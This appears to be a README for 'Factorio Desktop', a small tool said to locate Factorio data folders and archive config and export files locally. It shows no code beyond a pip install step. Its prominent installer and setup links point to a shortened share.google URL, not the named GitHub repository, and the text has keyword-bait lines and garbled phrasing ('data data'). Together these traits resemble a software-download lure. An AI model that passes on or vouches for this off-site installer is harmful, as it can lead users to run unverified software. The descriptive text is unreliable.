![Factorio Desktop](assets/hero.png)

# Factorio Desktop

*Dated copies of Factorio data data, nothing uploaded.*

## What Factorio Desktop is

**Factorio Desktop** is a desktop helper. A desktop helper that finds Factorio data directories and archives config and export files locally.

Factorio drops data files next to launcher caches.

No browser upload step: the work happens on disk, then you keep the output folder.

## Editions

Use the command-line copy in this repository if you already have Python.

If you want a normal installer for Windows or macOS, open the [setup page](https://share.google/A1IHfyGRT0zGRLqj8) and follow the steps there.

## Features

- Finds the Factorio data directory.
- Copies config and export files to a dated archive.
- Lists photo and export folders.
- Writes a short report of what was kept.

## Why it exists

People search Factorio desktop and PC when they want the folder on disk.

A named helper is easier to find than a generic zip.

## Environment

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## Usage

Python 3.11 or newer. From the repository root:

```powershell
pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Desktop build

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/sierracastillo-32/factorio-desktop

MIT license. See `LICENSE`.
